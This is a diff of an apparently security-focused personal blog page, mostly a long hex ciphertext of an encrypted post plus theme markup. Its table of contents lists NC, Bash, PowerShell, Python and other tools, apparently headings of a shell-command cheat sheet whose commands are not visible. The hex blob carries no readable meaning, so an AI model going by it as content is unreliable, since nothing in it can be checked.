df66816b7fa86384b1df0db89f8d5482afdaaca6cd703d7326d4940cb508742a94f32ed67516fc03e75caa2d289628e9ed45b44a6e853df6bb0ed6ea9ad0b8f1d3fb80141c47f34e13ed5c75b9efa0138d906e42dd2ee834032151a791279349b85139223b1a9c7f7a80a4d44fb743b5ccc745690b67e3ade0bf23893031579bdee94293a3dbff74fcb30e93d6391dee26c435f259fdbdcf739ba5a0a1c27c2313572e3d8545e307e25406a9945edfc79bc57e563313cf91fde13385a75cf1f1b4bd8543bc8b52c5813db5aaf1893a6f75c2e544aa5084b728a8b11e615c737beb3c454d56a116c9ce79867b42b8d74f9f9c05f13d26cd7997b68c7ea65f65141f121f1a6f83db2d943430836b4e07ad11aa2a0e15ecc633a1aa4635a4feb36f68274e407673f7021669aabd6b4d14db05b343b791ec3e9400a08c852a71873a372acc6c2868fdd31d1238eeee0e525771c6e40ca3f7b2cdd80a789946788cd9dba6f2adb4df93e93ab06ebfcbd36c0b6af8d300e34e1ee70b13526148a4ea305288d888050f1eb45bb18c222e079b49c55410a7a85dd96c14170377bd10ef46b1fd172143c5c7ff8c899d5993ee294f0b6ec81de387e154312cd01936661fbb128aff30c9b5e47e54ab298e7db277bc36464053d3cae349f176f4057fe4d7c5f306e7e5840726631d89f6ea82d9fcf716f5d9eb3b9b480d5b43e97c6dd4c419a67b3a193660d7a3cf923e056cdc7e56bc50aa9ac88bf87a805f855a7fad18df81a24fb11d3566df779ca11e0eff817caa1fdff3a0d055f2a4a9d86cb002c66f9c9d9c38af9f88c3d57256bdeb51e5090a02c4457a2ea5821f3bfdf7955dd4827e734bf804a16ca8976ff64aa075b6f61743087ebb8ae09dc03bff742ae6100ab13fac6258918d63b846f8bf06481bef98f091660865e63c59c3033ca2ff09f8add6c643fdfd4d88b60eb7e5eb6cf0cba58a803c77bbf824a6a527abc88268ead76899f042e64fd52c01a2bb2b09be34c3587efd39bbddc2b057ec85544970d02355a634ef06b86029e176fa0a7aa04b226862b3b690a977aeea87a21dd2316c473ca7fc5138c80e129f90b6948be87a5b91ca6be66e5ea86a7a690e1f57defb631bbeec671c11c27a5c8bf948a86ce4060a4f43c2b7617934c9e3dbd72315b093d27c8295aa999bcd91a7abdad763a371e2f56da83dd73686033ec66b418e0ef8ddd528e511831fe38d76b96d173f962d1d254bc6e012f9b425c3d044093fbd940de909ca1fcaa9303f0613b1a5106a721887a8b01b8b898170189fe0aeb2b090617c1999f672ed7e8a06ea9011d68a4efb276da82703c351220a04d5b24a82e93dfdc3ed81b529daabcbe25bca7f96ab912547a6bc18f3690d62c5bc6896a33ad1f06ee1040fc1c9b6e4bb4f2eb7fb29c79eb3aa3e83e71452ae242fea6b92795e7e166b567312e4a10a7a1384dcc3b8def396145658cf083b4b9a1ffd3c938b79d513b1f9efed87201b8da0e1dd1010b7fc20ec2c477c8fadff9d4499d2767af9d32befa75090d49c0f2440b57ca518d735712562ea503321c0ebf43a89a7409c59690708beddd07a7556a8d086017ebb740aef2171d34b5e9bc8cb4dc1916de187524286e8942e9fc704a8ef278857658d52defd06ab7876caae6cb52b6138e394c3c964f450b90b12ab46b3f752fb0b91fb28cf6e0442b953e8ffb8fff303f3b7958ac27c799a302786a8f744627de4398f9bb8ed6f538fd511bf18d1e3bc0f6fd5bd2672035679301c1078e17b57177c6f9cb97ea69d34e8e6abd671fc86daf0d2832801cd25dbaf65ef40261e776b745192537c1a2f395ea15b42120bb8f50f95d0a957502dcd18c7c1f94c44f53267e08b44c5ba7dbe9824f01f822696bc2aee7acabb8b55f70f087e354a927027938f55842b41809ee34e052a026510eb37e0e0dc87660c1a651281d61335c90b51337537cc7f8b0a64175f295d14f58f70de1b697f73e4656f2c9e14f4e5a1507c4a4c1bd57de3ab2dbf315c0c818f5807a6efb11de32963fba6527a43fbd250d48f226555c1e1af3c692f8dc0acdee183dd46f5b522d1f9d9cfdab1c38fd191154a0c6cb7f5a9fde272588c58f0b0d26256eb2726ca1f34c53a378f5d0f15189b110db57a3ae22e5e131ccdf65712ff3e58443bc7f101de56595cb245d3a423c4abcd01ff30b371cf3ef095feaed76a03ca27cd411980b56a4f0edf6116836af6a81f60f862a4a241333fb81c23469550ee4e21e806051639b95507dd314648faa6ab7d61cccaf5a8f2393f4beabf484cf5d76e8eccb5ea06662d38e65f2ba0911812e834b12ec84043281c999fee76eb4b264a73cc29b1df10e052837ada71c854f08850d728b6e7f886dac8fb0d823529daec0f82e1d978a250c97ea7b2d56bfc1767eb46c3b43944ca01ff28ae5f7d3f494e9f0336ace6ef6123f118f5efbb38c0396834562c19a12d80fffbeb5fb5b192a2958e7e22cc9641aa31afd0bdd87d2028056bdbaea02fe18a6f4668df077d5c8a23ad70c243a74b44576bb4333a0f0bf08fab2efdf7fca0789f1c6066f168d6ab4f9f6d6df3057472443613abb7b4ea178559c519a4f4f8391e5e450a9e3aa5fcdf10849607503ecbc486ec5dbcefde732af6f54862cbdd166faea16973579efdc5e12014905f0135cee17b08af96ab3acb22744a17e1eece5fb69d31da02460ca54b22e93aa76fc0d3260706e3bdc891394271228c61b1929a1d2a9fc93ffd3d7566225b9fc6f8ee02fd4f261f4a278825e78636e0ca798db5a4fd963eb88084379fed6bca085c87fb6a8690c3f52ca8a0da5a59034276d9f9c1fc5ca1eb1fde510dcf49f9c2e97ee04fa7fb1035528c9a41b7ae7da9509e435ae43ca05e009fd14de023f603a77f35a6801f34ac28ccb6cb779c5e26402915bdbf7f19a7af7d62bc64b47f5a50da57c8e5ebb77697e805f307a767cbfc458a462ed8f1489b56c37533bd7606f3eb92ebff965e3df85231e42c3ba175dbcc13b68fa5c963aab0ec1127e6460a1dc9a767c8333f62c4597956c56dfd2fe9a47bca67cf2c209555dffb525f7b4ac1331f0c65fb8ecfe83ff57428fa4a6f189c5feec018da17c0ff633f32ee91094019e4396214630cc37c18a36921381b3debb038a2a75b0702090227d468d46511ceef31c0a0aac1d03d3da23a2578c725f8545457fa1a0e891524960cad4227411358ecd6479a035629e5ca7fe68ce8b563263ca09e2de5ba5b6f44bb052dcc7938d2eedaf696731149e628ef10964db11faad0ea771dad6f56442230dc95de13e71133dff446c056f804b2c42d0a31da2725302cfa680c01ed2c09415481fee36986618d8d7578720fd2ecdccb302de95d7b4797335e5def33396bcf3143d8bab661ddc572bd14e154cb62f847294720faf1b477e0f0a072968e80232cc544ee17656529663eceab1fd9dbca5d61d7b277d33ba33a6442a1666d0c16e3fd961206d7ebf6eac8e980243468198855af97d0b2ab41ac0e6a90b28afe023eada47ffa099e35c519bcfe59aa9470953cf079c968e23f39585ff6182fe8d32bea1ad9eac98f4d92b27b2204efe5050e615990e5d5668a243848477ce71542a41f039c26c4ef204e468d679683737d59353e30945ff0603bcb8d270b0f36f63dfafef016e9d7af62a0a84f9be628b888758cde3aa08792df616c1a3e0be86da2765f86784b9d7dbf6a3cfcf9bcb270cc566ff0e2e0fe7af9eb7b5dcd4bb75499cf7284224d4e9d72086de7788070b2ce06bbf62766f1711e46f6e72d0e549db1276ccbc05047c8b0282512ddb1fea6e407cf583deb84285d3ea0b8bdca90741ae2f033fc0c8bd46000f84675067ea177209b5f3216d9ac2bf0ce7586ade6d20d25518146e78621ed6429b02b0b209216d260c2536ef0739d705b70670d6a6f64a7d04c6360f2c050548e408a90263028b9fc3eaff2990c0ca0826750c9fc9a946795cef96e4a80b31dd1fd847be3f1b20e3945b5e5ee5840094e3657b5df2925d10c67c759b5804c6b86b2170e9fcf300389d272df2597a46146ac124dacb919e8b5d5fe172d8e8dba0f5219eb4a67758c2e2fb4047b8297f686ea2241d8cdb29d42614be883ec93ca7392bd38ffc5fb2083f45a67350f574c1f3859ae0783145e091da06d6c1138b682f9a5e723d5476e08bf0036d396e4d5e807c2a7a45df6daa1173e40ccee5899197075f9429078d462b56073aa54cd20bf1c888956ae83eb6213b9f9d1ffc752305777c69e77ae2120fca154f2fa6cf23285fb003ef3c7e55408b2da4fbf7409135a40fa35e2e5e03d3c6d51512f32e628af0de52495ee28296cacd069680c2dc2102b8bfcc309975ea066f308f0b55ed51391048e5660a835a31a01d25ccda90701f0ff23b53bd45c1e1ff680e2c498e7dea360ca83a56a1b2ac6e2d1dd86814cc9d0ac737f9f1fe8f0d714ca2527038b8448a108df2bab4fae4576640014bfaa4a1e1126ee3576214ffa563dbc1b483d029bd06f58009e0a1b65e106203103a948197f279e5817696a3a01b60c2a93a0ce407a92fef68ffdd30aed8ccfd80a673d3c2cb24402d55cfe2339d870f4fa7243383f9e9cc368f1cc85572bff82c8169c414ea45aed0eb8420084b258dc25ad64804e0fddc1c87788708723e96c81bd241976adbcb96737cd655b5bc4f9bfe534a86e60cae5bd827c618dabfd1f57dacaad86c459f273ac74c03e932341c02076abfa4626950eccecc6872238889b061309a63d28ae3abc26ac16cf27861505239462ac301b5c59c0432a0933274563a2fce6bfb183745fb6e0176cc389b80565eefc97f71ac33be4357fa01a0985a5fb418be66899288950fd928fccf5060949aa46c71374fdab3b18b4679f4dd47794ca125a6974c0f3672948efadf30245b3358fb786e566554954078f76a033e72ec6e42094680ca2df10f51755bd8ac11c2e05086f6ad6451de31dfa877f284cc7d99dd333811142dc4c5d9a61e5985b1cef49305840a7abcebc5789edfb40ce120da13d4349252bb36135f33f48510f0b5b2a3c5728186f58b351dc0e249c74a9c1e483709dd93a1975ebabbc90e7bb6fdb78b4812ad5fac32ad52d14e2c70588a6b651d53f59118abf3a701670a0e01db05c642fcd5b0c7669eb03e0c10d83a46b5dddb943b6664a83c65bd70e1315a2e77788d206c134030932845affcdeeb58740fa08d21f38b180eb432ca97c97cf93f95b9265aae07c827f243f67961505cd0e3cd2973f72db2db36f2bdad546ce2a3db34e51638aa34f3da47fb561fa74aa0179c845a6c614c1abe5936c85692c114613caaad3c00f9e9e995503414c69987c97bac763f482b5b2352ff634006202b9c194c1cadf83a81c966ba72ddf4385e28f03ed035eb5547625ae8eaaf294316172eca440e894051b2bb8298e94aa56e3858cdc93ce131a2e905a01ef5d8069d9853bbcca9d4892a24071f86e3ccc0c7d204bcee835124a02878a67607a6cfcb67311eb0c3b19cff38ad243665d4b7b12141103d147302e15bc6db3914a9d6a339548725661325b51319e65286d72b4f01d21011dd21363a3e391cc3823a2339cd82dde28081395ac0bfda187cfbaf5b64cd86e970adac1b7824de76156879d0253b2f159ff286d3873bfd692063a7a33ac445fdd1801b1aa5441008676b79b58ff677ccb537a571c6b154f2797503498be85b093136edda011dc53e593da0c288b783893e423e6e25b4c278375eceb52cd8de07b8132eb429e29a8bae2b7863294d125100090a362a67f011454670c91913e13b8ab320215f62afa387f38ade0185f85a75b092a07f9e18b5938d0d756bef82d39d2dd6adfd28f7171758045a396b03aa0dd7c78725c433f5949f69ea0d4fcb311b1ddfedf0c1b130c3af902461d71de0cf7c4e99e460c82b67cd8037df1b5649b54bd0537be31a9c702288e8f6034ee9eafd4452e9b0b1021c75cc442b6cfb8cd63bbd77e7d926d3c478bdc71b254da0295c2ab11165a50ae62244aa49c7972058283543931f6c47aa4db9fb9b02b445f4373da1f989bd4c8a30ff1d4f01ef1a009ecb7bb414099a10136dc20bf96a3a12a6d7bc3e7cd3e86c7ff54a84523a5675c6fd7d474e76a5c447fec627a35199efe140fdfda48aff59628019eff6958c067b1074b6ddbfe81efacccf981276acb74322825c7411934f778fe82b63209606d9bb47eb7fcb8f586fb44002ed59411c461cec1f432abf5ec5bb9a3a447993c07acd53b39a7e35357c05237d2fe6fa23e4ef2f3c43022b8561f17cf0e0159a864e34cf0e1ed936479a594e13d82f62294a3582c151b0dc77641957606bc2d45c063fc0d023353f2739b5cfe280910b4541240e3b7ffb2ed96233a45159b97616ec1f8330a3f6f45e13fe816093fd3c3964a7009df9d97ac8a28cb7355dd0c054d1eda00376a1331a00fa244e890e6c07ee027f2e5c2cb1fc28a001648e1b6657a5fb5e6dad1be1cd9c4580e7f9a4d0fcfd570bb2b5b68b38fa8b083850c075bf4b329b4f2a33a3f0214914591a045b4466c8a7c52250cbcec29d168e8a28c5a3806394e68c9a802a143db71a9b05bc1f5bc229adc7cb1bce5669f7688847b00af89d53e0081a059708806d5a8b52bc90cb9240b6799245c6f62b5ea8b798d2bb19dd57756c1cd4d1437f754ab55d1f5a41c8f24257d6df869e963dcb739f1960c730be1cdd86c00653066547519f46b35ab8640d7bfae2eb6b6604cbe411d5eed98fda4ab51d2b4ba23010048577f679214e0a1f13f5087c60ec2dc26414bf00d49470f6729fdaf2b7fb63b44bdda6b124cb8af6228c8223fc07af418ff7ad994125e85d6a976b4c0b652e9e1b25fdb62d20fe146d0f3bf581ebc8249fcd67a0d686a0c51099dddcfedce5b9f2e5bf2e4b9765aaf4dd6ed1ca94ae56e190497639a57d7ece6ae4cc38cea803b1e4cfee0b0f525daa049a99e111f33040190a9e0ecd404d897f1b9e50a49e21958cc9274b29c02cf90b58cd79e90cea46ec7a4f4abcb208ed3a6cd8d1a831b69df916c02f3530112fbc243b4ea8f2678f9bee2d14370070f89ae2be1404ca4cdc48f4318e3459db27e7f16d3f90076e1ed4bc14f684c660041f9a7026cfdf89887a21e38691c455a0e42fd341023c54a4a52c7ab129d8ec68919f240b8b002bf81e2ebec627249c80333235c5807a853220a800edbfebf5c73e41a9a300328d41fab2148e08d531dab7235c8c9231a2acccd7cd7f5433438f8270f5c1fbdb0cb54ac9341c471e09f9776766f9f32a3c80dbca5eb1291f4fc92526533042730e55e545d0c90f4454b682e641365c33c53468809babfe35dca39984fb6d5ef261a13109b0c8de1370863502e6e220a3d2664d4ac7a0c99fae27ab3c143a04676c02c5cfd344f475ac14eb0ef516e38a5fccb20e571d8789a614bbfb291c9524a991935dac3a4571a8e4ba17224f39bd4c20fdb2016fcd983a88167df0597a6ed4a01a6fda2b50939be10c2a4d74efec21f5b2f7516d0b48048af7c1508219ce5fdfff330ecccdcfef8fec88028230c2f8c8636e69315e97501a8e1fe0d60251218b2ac60249bfcb554e1af05a7a28f6e2163c011c016559d5dd5c548df89994ee556862e4542fcea0bd849a718e09ff62a4e4c6358dfe1c64d62d64902b3d4de09c4b656aa45c7d2fc4b492c792a53a6a95cecd690da6da641a0f91263076e85c3e20abe7d654bf6b204c47943b21909b50201d60629c0df577c5c333f40204dd96fbabb01c60fe6bdc2984b684beec859bd359763c6177326c080f28222419c8aca69c8ef834d78aac303cb291ec71841c78eaf7504eeb82ee7d9257030d71cee37cc048ecb6ed610ad902b37e4f01a8feca1702c08df20f18fd6773f087e077dd635dd7cfdf8f21e8d98697170ef637bda3a23c0fc235d57787b3e2e79fed956260964b871f232df84ef33120b6ebf8d8f68088a96afcf2364b47e2fe21980bb121312f0f7d3c4b4b205186e78641fd8e3d6806889bc3dc71d4605e18559492f0a0b1834cecee1e9ae361f4f6e30d762aabb1e35ab559eade25801e77f5dc578884a0ba9662337c896e4e004d9f8e6f6bb0f691bbb0143faf5190cbaaf66bbc48b5a7aa43850c154f91142f5105db1be8d2d0b08ea291b4398b2001002ce083ba90050899f2261bf4c81defe649088b25083f5814bf18a9de051e0a46cfba067ed17cfbbd8381aa15dc1646b800f8c637eb822f5e1c9928fcaf613c78f1886a4e554ce69fd01218f5ff79d43f46b158f6b94e6e02ce5154e02a0227338d19cf00ccd5b4dcaa2fcd7411914e06a753d3f3f4e9f911ed0c02310f2b104aa3f72f003dba62d2167b413c18e4dab444d80acd940bd073b8186ceafe8fd9999c3186e1b15503041aacba6bc2a5fe1389939e6ff813aa24b9ac5465dad8c89e4ca3e539a66198ff4c6ef1261569020038f895d35fe42ee763b3efdd38ad7424e3f06a48eaab1ecc5493e0e32b2368a427438fbf93c519210932bf6515cbdd652bb0fb6a72263760048e38e7b7757ac32b1ba823a001b1ab5373fa866968a2c191988703cc00ed42f84ec4ec8fe585fc0fc0969c403e61b98b6cdacd499b88c9a873d41d19c05711e2b6f4cda99364c8f88215ae0d9046954b05b9ce815bd0080e2b9ce1de6cbfa370053f35318863acdb256984f687dc126299251176751525e4aaaf3628f13edd82c4aee1169e6cba15a4918d03982bee6489f27c10338198c427128b72bc41077109334b72da77a6150355047a92a791b1a2c225d8d076cfbc7fabfc4e1c73c8bde3dd86b660a54bf74046eb751bdc05f03ad5b6ac845bca17598875c257c18b562b1bc37fa0bef5f4599dcf26882ed50d715936ef2d1584f2c82fcfc998040a55318c529dfa90c02588d99e319da5c9ae31e7407211d0a335b37956c4c1df303bbb00a1daaff217f7b29deab6340da1fe9bff6b2c8cb6409f01e522ef4a2f4c15e539a6da5e5322a7fbe870ea222a4bfc74d29e94e1ae874d4bc3cad275ae2489ba66b84b14e1c82516d46c478cc00ecb9f8c9bd794f5a991af317a98a609e8725c125d9eec5d68115a365585a18bdd405da6b5fcfc6ac7e07c777edca6ef1e3dfe8ccdde298bc2fbfe9bc98e8ab8e36ca49847353d460cb53759a7cf94b7c293cd60ff3cc3e16ef893951a00bf757c26c632a606fb1a8e1e69bb358f67a5bd03e1102332d71c391a2a203b02e60abe65e30ad24177073dc25e4af4617638ed468da8b2e5c931543997408e3a45c029d14d30abb4af429923b4b0371a8b00927547a7606ad04660340af940abc41857068d4bf63318c5f59c759d6dea63e1413d0dcf3997d675bd798839b0fe8d010cf4d72dc65442190ce1de18271ef1731d87652d16fe0c7021fca2d769f04129b916b1f32157326f03e47080d4305741a205aa9b5f956fd244f0d929e2990cd0330cccdc5b1442870f0600581355c5a517ce64c1ca2b3ee6d2daeb22d0c0a81b04083079e50323039dde505867a550e7055579cb8cc8ef49ccc1474cd0ea9978faaf6163e8b816ea5ab88be26415546712723d4157a5a7ec97ebea16b19cb1186c28dbf69b754dfaa89a6e40a90dba6b5dce9f771428cda18a89c8ff63bc9661911a4ad349bf60300bd1bf728b452a9f67d3011ed5c1b24e09a372a2aa2cd924a88070ac8841504c516d594269efb0d897904726be2272b53514331056e82dd485d35061b8d87c52a3f7f4f2a8917c0bbeecc537ff62cf6d5f77762f3375d25766a6b99c1752c965883ad4f5363b1b81153da536eba090d8725a5f0cf4794270007e4d913a3b1d75595a7722d62e590621241cefa967171a1634306b9d3248d210bf5229101cce86271cc4ce2bbfce898ae721580dafc8f89283c3e4675740188b8aa3a84abdbde535d97d7cdf6c8ed292237651f6265b8c8d378a9d2abf078a47cb46d2f521931442855c4d3850c8e60e354a219bcc5960b0056861deb05f0c997555df03da583aa6dcd9ae65c52af14bf65fe6356b5715ee8ebac38847b488017c7e69691c176f0efb9085a461f7fd8644961c18d2c478feceadbb0f8b550ddb369904f505fdf7dd90ab0ac62ca899732df8b777cd157f5307840411ecbae384f55f5c3f6f25a7b7ff6c0c51b0143b743240c775f4edc99273e39c17789e5e7fb6b9ef6ffe5150357b611579551dc5fae2245b974e7a1dda78a3c30f4b879d0f1d90a53c3d6d153448867c827f2d858ce6deba8b1e051dc6ba16e3959882fc34f50ed1185ace3df034167b6d9ecb040034d526f661441cd26fcb4aa2713562596065fa8a8f8b9b9bb13b4436e7fc273c3090aa1243acd9e8cb20b2929286e8af405f97419a267acec07f6d1d1213db2252031ad9ae8a2fdff52f2a6b21ad474081a5902b08d00d99559693cf9ed48b13fecb5bdb058225793ac7642bbc4ad0dd990304fc185d4aff9082196e91000bf4d21443c9ebfd4205f0496bd688b44d648284f635c92f938c78d6d2c9804283956d42aaf2a4d7f8236c04f477bbff14ac92af7ed536cde80d42f4d6ed955b7ffa5503bd2bab7bd0c7ae01e147c7f32df1fe656593c7ac95172417139918197d18836d84390eb34b005bcc1c9dd8d182cd7b972c20c32357904cfecd4b507649c7c4155d6e13a696c4c4d6645d03e72104ba72d8a816ce64b1812d20f361d9dfe2e2a580619390959a9e3316cae8ff7ea3596be4d6f3a37108edba3960ba00f8a18859e60f2516ced2c13314c7ddb75be7291b3b779ab48083e3080b5ca8f1d96f7456cf5bfd40bc5ff3a0edd279a99558fc4565ca1c43af2abe9193ef12d0bf8714ab8e00c77d0d752f5ab212cfcb0c63c204bf18b9de9db221cb8c5bbe7c9dfaa5e967934364d4692c466aed53acaa01eb2bd8561a2e74bfaffa490cc480240fb9606c6084e609bd9a66c0e21c699a82dd0bc120320988f1d0efe0dbb795c2642d6b71c84ca232dd7c440ec340a3ffba35842803d6a46d38cbe5aec6774e4e90203313e015353cf6f694882d4642a4289f464b8d8d06c5591ec6ed0c58765faf9d53224a9b20c4a8e657d7a0a2c4aacc30762dbd88162ab4b71736f59065da552ad8fd1f37dae8a36796027610a76283c505eef099f2cfe5fb432107419ee6eb22308d74e8457b00dc693984fd8ca0c9fe075160a23ae2c4d5328b16ede007b14f857247edbfeb7c9f07d2eae3734b8282d0aa0048aae5ca2ce4215e4113ecaaba3161f308fa8abc552f422b8bf7909a50d0c655779098a3313bd290c052551deb602ab274b0f3a5702d4bb76bced91719b5d19cc15c9f942f23dddf874702c366b171d8b050f2803f1a0d739bfc19adf7799dfdb59d3bec6d556dd8a557e6f47c15619574f3156448623ce2a8b15056dc28cc2b28a4eca939c0d03779ae668ed067d3280a0f1316edecd348804dab107361d6aed87354c3fbc6f8aa4e582d5773cff1eb8bd04e60f690554bdf41c8ec33b69870d76cc27c51050ea33b339864ae5b38e3f6319d9e1feabf90dd79628d61a165a1e87fb124fd90378c3c6d8ed33a5e97b570ce5ae622b351ffa54059c7045d704334b7fa849614c12c7fe0f86631a89cfca9d3e1b53d8b6a859e9150bc3eccc54ed1279e10ce264083ecb769bec94e6b970d9404023b67fd98a4e805e735654c068eccdb99d32dd4d861e77a18ce61177ff2c60db1125b1b086c8dee0c75f81cf16797de80d000a12cb74705b3bddd3834e2804af5116f46fed03dcc863cb100eb5a4d028e324f7fdd530a2f63e1ecc6e967ad0cfc1a6431d68e5e0da0ab5f629b788fb24efcd234da1e255b11c674dc8ac63ef283f58b4ba0449307a6d539d9370fe04af7d2452c996684b43912d02ea4855710e6cadc1a518d637ec1236caee2476ee96180b7c6b10a734f18134669b9b9a0286098d4bfcc07fc7cd5490e0c53b571d2f0f8e34492f9681a23a00f530c8eaff70f3989def6dd7dd7d2a39f49d26d1be0c11750cd812a0409198ce6c159ed9d0c24080b4746ee798f4c03bc0cf5af05f8c2097e6c43839131987d7ad79dc5544028c0de9108b22381299b461bfd8ba2cfc2386b68503d03b383b6d9301d40ba393572149b68b82828e5a9d6e3e7d1f8eb4a79ed4b32a94a69a1fc0f53aedf1f904f5add1f20c016fb5085f3a122f3033ae2173d5a30dba7b0be0bdc8263ab15528e3beaf556f45e319bcc6c1bca390c313cd7150b6c80f77b0fa575012cc41d31bc8b44863272be117bcac4f91daa7d4be3c93f9b4577612978604644568914d6c7a6a005f42de44cfc4d806070a12d51ebb6db999dd22b50cc1312212706e0a0a44850212e053c72f32b4cf572c3797e1567842a386abda17b8e66348d24704abaf6a1bf26c0956ee61e84201bb092b2cbb4c5e64a8f1e283d7bfa70da7b707ccf6ef33f29115c75595bb9bf2e62962bf1c53dc9b8267a96b3f5dae1a1ffe5b341099192dcf88cced702149275731609a4245ab868f6a626a4cd63f630d2300570a695f0c9d380c2cd83fee00a4a5adab189e132a8c06fad348c96ce9fb3ea981ebc8c51640b9c2f7298fda0274f01fbd3c316144cea2dee0dc34b78432589d471ad524828c2755402c4697e6cef281886b7bc8124477180349edce46f2fe2a0e0c192726c33cc023a3fbb0b081663b41e90d06190d291409d49482dfb1276db7d4ef57bce89b244597146bb3298e1902a4c0baf99e7eedea8dfa098cdf7f17369a5505f593b1267d122598ab55f7a87941171db92df374dd0a0f57fbf66ea2273c3b2512247a0463996d644c1718e618633ebef4eb68903afc471827913915db709209c8cfe05a070b4560a43c92791e48bb943e66ac8ae93da16ef8dcb4407228e2ce9628ad340d645e71991b2669ccc2a81ef032b922dac0fb2ada7fc7cd72cebda1b1009348e5448549ecb38d4cc6d60fed4aaa7e0652a39b74c92594bf79d6bd8834e0c3742a7bfd54d2edff3d5dc22037c2d408f183a1e8de614deb99248af6987041bbeff244ad07ec264f768b9d047e7184f66e444de07cd0ec2f12e45c5d2cebd5fd8bae68a73c64b27e01313e7777c3688e860fc520bcb0af26693eb2e08a95cbb3051f0d8b02416876f040e37dc0c7a5a504b370a3a454d5f9b3834e15ab5144e7b79e315652bc9829fb01347ec18adbc36b53404126b264cb4e118ab85a4a01bc3b4a744fc3d2fd308954be63586d247497061855bbffc7ac9c36ee623e99e9022e1480132f7e8d33a4bc8d128a2447cd959e917f66fd72dbeea7468ba146110f1ee16c5cc7916a44d1a0684f4e40ecbf7e32cf66e10080d30533dc95576c50e9015820233c63734fab822733d189bb45bc7c79154296df2604</script></div><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">
+            </div>
+
+            <!-- Post information -->
+            
+            
+    <div class="col-lg-8 offset-lg-2 col-md-10 offset-md-1">
+        <ul class="pagination d-block text-center">
+            
+                <li class="previous page-item d-inline"><a href="/2019/04/19/Typhoon/" class="page-link float-left">&larr;  Newer</a></li>
+            
+            
+                <li class="next page-item d-inline"><a href="/2019/03/23/DC-1/" class="page-link float-right">Older  &rarr;</a></li>
+            
         </ul>
-      
+    </div>
 
-      <section class="site-overview-wrap sidebar-panel">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
-            
-              <img class="site-author-image" itemprop="image" src="/uploads/avatar.jpg" alt="t43wiu6">
-            
-              <p class="site-author-name" itemprop="name">t43wiu6</p>
-              <p class="site-description motion-element" itemprop="description">何人的归宿是星辰大海?</p>
-          </div>
-
-          <nav class="site-state motion-element">
 
             
-              <div class="site-state-item site-state-posts">
-              
-                <a href="/archives/">
-              
-                  <span class="site-state-item-count">14</span>
-                  <span class="site-state-item-name">posts</span>
-                </a>
-              </div>
-            
+                <!-- Comments -->
+                
+
+                
 
             
-              
-              
-              <div class="site-state-item site-state-categories">
-                <a href="/categories/index.html">
-                  <span class="site-state-item-count">4</span>
-                  <span class="site-state-item-name">categories</span>
-                </a>
-              </div>
-            
-
-            
-              
-              
-              <div class="site-state-item site-state-tags">
-                <a href="/tags/index.html">
-                  <span class="site-state-item-count">14</span>
-                  <span class="site-state-item-name">tags</span>
-                </a>
-              </div>
-            
-
-          </nav>
-
-          
-            <div class="feed-link motion-element">
-              <a href="/atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
-
-          
-            <div class="links-of-author motion-element">
-                
-                  <span class="links-of-author-item">
-                    <a href="https://github.com/t43wiu6" target="_blank" title="GitHub">
-                      
-                        <i class="fa fa-fw fa-github"></i>GitHub</a>
-                  </span>
-                
-            </div>
-          
-
-          
-          
-
-          
-          
-            <div class="links-of-blogroll motion-element links-of-blogroll-inline">
-              <div class="links-of-blogroll-title">
-                <i class="fa  fa-fw fa-link"></i>
-                Links
-              </div>
-              <ul class="links-of-blogroll-list">
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://gh0st.cn/" title="Acmesec_Chen" target="_blank">Acmesec_Chen</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://quyunjie.cn/" title="quyunjie" target="_blank">quyunjie</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="https://chybeta.github.io/" title="chybeta" target="_blank">chybeta</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://rcoil.me/" title="Rcoll" target="_blank">Rcoll</a>
-                  </li>
-                
-                  <li class="links-of-blogroll-item">
-                    <a href="http://yulige.top/" title="郁离歌" target="_blank">郁离歌</a>
-                  </li>
-                
-              </ul>
-            </div>
-          
-
-          
 
         </div>
-      </section>
-
-      
-      <!--noindex-->
-        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
-          <div class="post-toc">
-
-            
-              
-            
-
-            
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#NC"><span class="nav-number">1.</span> <span class="nav-text">NC</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Bash"><span class="nav-number">2.</span> <span class="nav-text">Bash</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PowerShell"><span class="nav-number">3.</span> <span class="nav-text">PowerShell</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Python"><span class="nav-number">4.</span> <span class="nav-text">Python</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Telnet"><span class="nav-number">5.</span> <span class="nav-text">Telnet</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#AWK"><span class="nav-number">6.</span> <span class="nav-text">AWK</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#PHP"><span class="nav-number">7.</span> <span class="nav-text">PHP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Ruby"><span class="nav-number">8.</span> <span class="nav-text">Ruby</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Perl"><span class="nav-number">9.</span> <span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Java"><span class="nav-number">10.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Lua"><span class="nav-number">11.</span> <span class="nav-text">Lua</span></a></li></ol></div>
-            
-
-          </div>
-        </section>
-      <!--/noindex-->
-      
-
-      
-
     </div>
-  </aside>
+</article> 
 
 
-        
-      </div>
-    </main>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.css">
+    <style>
+        #toc-content .toc-link::before {
+            background-color: transparent;
+            max-height: 25px;
+        }
 
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">t43wiu6</span>
+        #toc-content .toc-link.is-active-link::before {
